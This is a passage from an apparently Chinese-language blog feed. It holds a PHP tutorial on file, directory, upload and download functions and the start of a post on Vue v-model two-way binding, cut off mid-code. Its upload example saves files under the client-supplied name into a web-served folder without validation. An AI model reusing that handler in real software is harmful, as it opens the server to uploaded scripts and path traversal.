判断文件是否可读写</p><p><code>filectime(string $filePath): int</code> 获取文件创建时间，返回一个时间戳：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d G:i:s&#x27;</span>, <span class="title function_ invoke__">filectime</span>(<span class="string">&#x27;index.php&#x27;</span>)); <span class="comment">// 2019-12-31 16:16:22</span></span><br></pre></td></tr></table></figure><p><code>filemtime(string $filePath): int</code> 获取文件的修改时间，返回一个时间戳</p><p><code>fileatime(string $filePath): int</code> 获取文件的修改时间，返回一个时间戳</p><p><code>stat()</code> 可以获取到文件的信息，返回是一个数组，用来表示信息</p><h1 id="2-目录的基本操作"><a href="#2-目录的基本操作" class="headerlink" title="2. 目录的基本操作"></a>2. 目录的基本操作</h1><p><code>basename(string $filePath): string</code> 返回路径中的文件名部分:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>; <span class="comment">// /var/www/html/php/demo.php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>) <span class="comment">// demo.php</span></span><br></pre></td></tr></table></figure><p><code>dirname(string $filePath): string</code> 返回路径的目录部分</p><p><code>pathinfo(string $filePath): string</code> 返回文件路径的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 返回示例：</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">    string(22) &quot;/var/www/html/php/file&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">    string(6) &quot;03.php&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">    string(3) &quot;php&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">    string(2) &quot;03&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>opendir(string $dirPath): resource</code> 打开目录句柄：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dirHandler</span> = <span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;./testDir&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>readdir(resource $dirHandler): string</code> 从目录句柄中读取条目，返回目录中下一个文件的文件名</p><p><code>rewinddir(resource $dirHandler): void</code> 倒回目录句柄</p><p><code>closedir(resource $dirHandler): void</code> 关闭目录句柄</p><p><code>mkdir (string $pathname [, int $mode = 0777 [, bool $recursive = false [, resource $context ]]] ): bool</code> 新建目录，返回一个布尔值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;dir/subdir/subsubdir&#x27;</span>, <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">// 可创建多层目录</span></span><br></pre></td></tr></table></figure><p><code>scandir ( string $directory [, int $sorting_order [, resource $context ]] ) : array</code> 返回文件中的所有文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(9) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">    string(1) &quot;.&quot;</span></span><br><span class="line"><span class="comment">  [1]=&gt;</span></span><br><span class="line"><span class="comment">    string(2) &quot;..&quot;</span></span><br><span class="line"><span class="comment">  [2]=&gt;</span></span><br><span class="line"><span class="comment">    string(6) &quot;01.php&quot;</span></span><br><span class="line"><span class="comment">  [3]=&gt;</span></span><br><span class="line"><span class="comment">    string(6) &quot;02.php&quot;</span></span><br><span class="line"><span class="comment">  [4]=&gt;</span></span><br><span class="line"><span class="comment">    string(6) &quot;03.php&quot;</span></span><br><span class="line"><span class="comment">  [5]=&gt;</span></span><br><span class="line"><span class="comment">    string(6) &quot;04.php&quot;</span></span><br><span class="line"><span class="comment">  [6]=&gt;</span></span><br><span class="line"><span class="comment">    string(3) &quot;dir&quot;</span></span><br><span class="line"><span class="comment">  [7]=&gt;</span></span><br><span class="line"><span class="comment">    string(8) &quot;text.txt&quot;</span></span><br><span class="line"><span class="comment">  [8]=&gt;</span></span><br><span class="line"><span class="comment">    string(15) &quot;文件操作.md&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="3-文件的基本操作"><a href="#3-文件的基本操作" class="headerlink" title="3. 文件的基本操作"></a>3. 文件的基本操作</h1><p><code>fopen ( string $filename , string $mode [, bool $use_include_path = false [, resource $context ]] ) : resource</code> 打开文件或者 URL，返回一个资源句柄</p><p><code>fread ( resource $handle , int $length ) : string</code> 传入文件句柄以及读取的字节数，返回读取的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># test.txt</span><br><span class="line">abc哈</span><br><span class="line">哈哈哈哈</span><br><span class="line">abcabc</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>); <span class="comment">// 设置浏览器的 ContentType 信息</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>); <span class="comment">// 以只读方式打开</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="number">1</span>)); <span class="comment">// string(1) &quot;a&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="number">1</span>)); <span class="comment">// string(1) &quot;b&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="number">1</span>)); <span class="comment">// string(1) &quot;c&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="number">3</span>)); <span class="comment">// string(3) &quot;哈&quot; （中文占用三个字节）</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="number">1</span>)); <span class="comment">// string(0) &quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>fget ( resource $handle ) : string</code> 从文件指针中读取一行，返回读取的字符串，如果文件读取完毕返回一个 false：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>); <span class="comment">// 以只读方式打开</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>)); <span class="comment">// string(7) &quot;abc哈&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>)); <span class="comment">// string(13) &quot;哈哈哈哈&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>)); <span class="comment">// string(6) &quot;abcabc&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>)); <span class="comment">// bool(false)</span></span><br></pre></td></tr></table></figure><p><code>feof ( resource $handle ) : bool</code> 测试文件指针是否到了文件结束的位置</p><p><code>fwrite ( resource $handle , string $string [, int $length ] ) : int</code> 写入文件，返回写入的字节数，其写入的内容会覆盖原有的内容</p><p><code>fseek ( resource $handle , int $offset [, int $whence = SEEK_SET ] ) : int</code> 在文件指针中定位：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>); <span class="comment">// 以可写模式打开文件</span></span><br><span class="line"><span class="comment">// 在文件末尾写入内容</span></span><br><span class="line"><span class="title function_ invoke__">fseek</span>(<span class="variable">$file</span>, <span class="number">0</span>, SEEK_END); </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&#x27;新内容&#x27;</span>);</span><br></pre></td></tr></table></figure><p>也可以使用其他方式定位文件到尾部：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>); <span class="comment">// 定位到尾部打开文件</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&#x27;新内容&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>rewind ( resource $handle ) : bool</code> 倒回文件指针的位置</p><p><code>flock ( resource $handle , int $operation [, int &amp;$wouldblock ] ) : bool</code> 轻便的咨询文件锁定：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="comment">// 文件加锁</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">flock</span>(<span class="variable">$file</span>, LOCK_EX)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;啦啦啦&quot;</span>));</span><br><span class="line">  <span class="title function_ invoke__">flock</span>(<span class="variable">$file</span>, LOCK_UN); <span class="comment">// 文空解锁，脚本执行完毕后也会自动解锁</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;文件加锁失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>file ( string $filename [, int $flags = 0 [, resource $context ]] ) : array</code> 把整个文件读入一个数组中</p><p><code>copy ( string $source , string $dest [, resource $context ] ) : bool</code> 拷贝文件</p><p><code>unlink ( string $filename [, resource $context ] ) : bool</code> 删除文件</p><p><code>file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] ) : string</code> 将整个文件读入一个字符串</p><p><code>file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int</code> 将一个字符串写入文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://www.esunr.xyz&quot;</span>));</span><br></pre></td></tr></table></figure><p><code>rename ( string $oldname , string $newname [, resource $context ] ) : bool</code> 重命名一个文件或目录</p><p><code>readfile ( string $filename [, bool $use_include_path = false [, resource $context ]] ) : int</code> 读取文件并写入到输出缓冲</p><h1 id="4-文件的上传"><a href="#4-文件的上传" class="headerlink" title="4. 文件的上传"></a>4. 文件的上传</h1><p>关于文件上传，在 <code>php.ini</code> 中必须开启相关的设置，默认配置是会开启允许上传的，我们可以修改上传文件所允许的大小，其选项的缺省值入下：</p><p><img src="http://study.esunr.xyz/1577935940955.png" alt=""></p><p>使用表单上传文件到 php 脚本后，可以使用 <code>$_FILES</code> 获取上传文件的信息：</p><p><img src="http://study.esunr.xyz/1577939066633.png" alt=""></p><p><code>is_uploaded_file ( string $filename ) : bool</code> 判断文件是否是通过 HTTP POST 上传的，传入文件路径</p><p><code>move_uploaded_file ( string $filename , string $destination ) : bool</code> 将上传的文件移动到新位置</p><p>完整的服务器端上传接口示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: application/json; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$fileInfo</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]; <span class="comment">// 表单中的 key</span></span><br><span class="line">  <span class="variable">$tmpName</span> = <span class="variable">$fileInfo</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">  <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">  <span class="comment">// 检测是否通过 post 上传</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmpName</span>)) &#123;</span><br><span class="line">    <span class="variable">$moveResult</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpName</span>, <span class="string">&quot;./static/&quot;</span> . <span class="variable">$fileName</span>);</span><br><span class="line">    <span class="variable">$result</span> = [</span><br><span class="line">      <span class="string">&quot;upload_file&quot;</span> =&gt; <span class="variable">$_FILES</span>,</span><br><span class="line">      <span class="string">&quot;moveResult&quot;</span> =&gt; <span class="variable">$moveResult</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;没有使用 POST 请求或上传文件错误&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$e</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回成功示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;upload_file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;30311024.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/jpeg&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tmp_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/phpEetT2V&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">3535</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;moveResult&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="5-文件的下载"><a href="#5-文件的下载" class="headerlink" title="5. 文件的下载"></a>5. 文件的下载</h1><p>当我们下载文件时可以通过访问文件的 url，但是在某些情况下我们不希望将文件的 url 暴露给用户，所以我们希望通过访问一个 php 脚本，让这个脚本返回用户将要下载的文件，这样也可以方便我们动态返回文件：</p><p>首先需要开启 <code>fileinfo</code> 插件，需要使用到如下的方法：</p><p><code>finfo_open ([ int $options = FILEINFO_NONE [, string $magic_file = NULL ]] ) : resource</code> 创建一个 fileinfo 资源</p><p><code>finfo_file ( resource $finfo , string $file_name = NULL [, int $options = FILEINFO_NONE [, resource $context = NULL ]] ) : string</code> 返回一个文件的信息</p><p><code>finfo_close ( resource $finfo ) : bool</code> 关闭 fileinfo 资源</p><p>通过以上的三个 API 可以获取到文件的信息，这样我们就可以通过设置 http header 以及使用 <code>readfile()</code> 方法来将文件输出给客户端，以下是一个完整示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;./static/30311024.jpg&quot;</span>;</span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="variable">$mimeType</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$fileinfo</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">finfo_close</span>(<span class="variable">$fileinfo</span>);</span><br><span class="line"><span class="comment">// 指定类型</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:&#x27;</span> . <span class="variable">$mimeType</span>);</span><br><span class="line"><span class="comment">// 指定下载文件的描述</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachement; filename=&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>));</span><br><span class="line"><span class="comment">// 指定文件的大小</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length:&#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));</span><br><span class="line"><span class="comment">// 读取文件内容输出到缓冲区，返回这个文件</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue父子组件之间的双向通信</title>
      <link href="/2019/12/35d62d103ef6.html"/>
      <url>/2019/12/35d62d103ef6.html</url>
      
        <content type="html"><![CDATA[<p>Vue 与 React 为了防止父子组件之间的数据混乱，所以为设计为单项数据流，即父组件仅向子组件传递数据，而子组件无法修改父组件传入的数据，从而影响父组件中的数据。然而在 Vue 中，双向数据流还是可以通过很多方法实现的，比如 <code>v-model</code> 双向绑定就是 Vue 提供的一个数据双向绑定的概念，也是 Vue 的特性之一，除此之外，</p><h1 id="1-v-model"><a href="#1-v-model" class="headerlink" title="1. v-model"></a>1. v-model</h1><p><code>v-model</code> 可以绑定于 <code>input</code> 控件上实现数据的双向绑定，在 Vue2.2.0+ 中新增了自定义组件的 <code>v-model</code> 可以实现对组件内的数据绑定，我们可以借助 <code>v-model</code> 来实现向组件内传入数据并且组件内可以修改该数据。</p><p>我们以封装一个 Input 组件为示例，我们首先编写一个子组件，上面挂载一个 <code>model</code> 属性，同时设置一个 <code>props</code>，其中 <code>props</code> 设置的参数需要于 <code>model</code> 中的 <code>prop</code> 字段对应：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clip-input&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&quot;Input&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">model</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">prop</span>: <span class="string">&quot;value&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">event</span>: <span class="string">&quot;input&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">props</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">value</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">type</span>: <span class="title class_">String</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">default</span>: <span class="string">&quot;&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们在组件上设置的 <code>model</code> 对象拥有两个属性 <code>prop</code> 与 <code>event</code>：</p><p><code>prop</code> 为 <code>v-model</code> 传入的值被挂载到该组件 <code>$attrs</code> 上的对应值，如果设置了对应的 <code>props</code> 属性就可以接受到这个值（如果设置了 <code>props</code> 那 <code>$attrs</code> 上对应的值就会被删除）。如以上示例，我们在组件内就可以通过调用 <code>this.props.value</code> 调用到 <code>v-model</code> 传入的值。</p><p><code>event</code> 是一个可触发的事件，在组件内可以使用 <code>this.$emit(&quot;event&quot;, newValue)</code> 来触发这个事件用来修改 <code>v-model</code> 中传入的值，并将其值修改为 <code>newValue</code>。</p><p>在上面的示例中，我们只接受到了父级组件绑定在子组件中的值，但是未向外修改该值，对于上述的组件来说，我们需要在 Input 组件初始化时接受这个值，在文本框文字变动时，来修改这个值，那么利用原生 <code>&lt;input&gt;</code> 组件的 <code>v-model</code> 指令与组件的 <code>computed</code> 属性就可以实现这一效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clip-input&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;inputValue&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&quot;Input&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">model</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">prop</span>: <span class="string">&quot;value&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">event</span>: <span class="string">&quot;input&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">props</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">value</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">type</span>: <span class="title class_">String</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">default</span>: <span class="string">&quot;&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">computed</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">inputValue</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title function_">get</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 当父组件改变 v-model 的值时，在这里重新计算值 inputValue 的值</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title function_">set</span>(<span class="params">newVal</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 当子组件修改了 inputValue 的值（通过 input 的 v-model）时，在这里修改父组件绑定的值</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 之后就可以引发重新 get</span></span></span></span><br><span class="line"><span 